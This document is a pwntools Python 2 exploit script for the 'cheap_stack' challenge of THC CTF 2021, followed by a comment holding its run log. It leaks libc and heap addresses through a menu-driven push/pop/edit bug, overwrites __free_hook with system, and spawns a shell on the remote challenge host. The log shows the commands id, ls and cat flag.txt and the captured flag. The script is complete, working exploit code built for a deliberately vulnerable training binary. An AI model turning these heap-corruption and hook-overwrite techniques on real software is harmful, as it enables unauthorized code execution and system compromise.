from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './cheap_stack'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "remote2.thcon.party"
  PORT = 10903
  s = remote(HOST, PORT)
  libc = elf.libc
else:
  s = process(BINARY)
  libc = elf.libc

def Push(data):
  s.sendlineafter("> ", "1")
  s.sendlineafter(": ", data)

def Pop():
  s.sendlineafter("> ", "2")

def Edit(data):
  s.sendlineafter("> ", "3")
  s.sendlineafter(": ", data)

for i in range(5):
  Push(chr(0x41+i)*0x10)

Push("F"*8+p64(0x471))
Push(p64(0))
Push("H"*0x3f)

for i in range(11):
  Push(chr(0x49+i)*0x10)
Push(p64(0x11)*7)

for i in range(14):
  Pop()

for i in range(14):
  Push(chr(0x61+i)*6)

# libc leak
Edit("XXXXXXX")
Pop()

s.recvuntil("\n")
r = s.recvuntil("\n")[:-1]
libc_leak = u64(r + '\x00\x00')
libc_base = libc_leak - 0x3ec0a0
free_hook = libc_base + libc.sym.__free_hook
system_addr = libc_base + libc.sym.system
print "libc_leak =", hex(libc_leak)
print "libc_base =", hex(libc_base)

# heap leak
for i in range(5):
  Pop()
Edit("XXXXXXX")
Pop()
s.recvuntil("\n")
s.recvuntil("\n")
r = s.recvuntil("\n")[:-1]
heap_leak = u64(r + '\x00\x00')
heap_base = heap_leak - 0x850
print "heap_leak =", hex(heap_leak)
print "heap_base =", hex(heap_base)

# stack clear
for i in range(7):
  Pop()

for i in range(4):
  Push(chr(0x30+i)*6)
Push(chr(0x34)*0x3f)
Push("X"*0x18+p64(0x51))

for i in range(2):
  Pop()

buf  = "Z"*0x28 + p64(0x51)
buf += p64(free_hook)
Edit(buf)

Push("tmp")
Push(p64(system_addr))
Push("/bin/sh\x00")
Pop()

s.interactive()

'''
mito@ubuntu:~/CTF/THC_CTF_2021/Pwn_Cheap_Stack_500$ python solve.py r
[*] '/home/mito/CTF/THC_CTF_2021/Pwn_Cheap_Stack_500/cheap_stack'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to remote2.thcon.party on port 10903: Done
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
libc_leak = 0x7f48a01150a0
libc_base = 0x7f489fd29000
heap_leak = 0x56543aded850
heap_base = 0x56543aded000
[*] Switching to interactive mode
Popped value: /bin/sh
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ ls -l
total 140
-rwxr-xr-x 1 root root  17344 Jun  8 20:15 cheap_stack
-rw------- 1 user user 380928 Jun 12 22:52 core
-rw-r--r-- 1 root root     44 Jun  8 20:15 flag.txt
$ cat flag.txt
THCon21{15_7h15_4_5t4cK_Buff3r_0v3rfl0w???}
'''
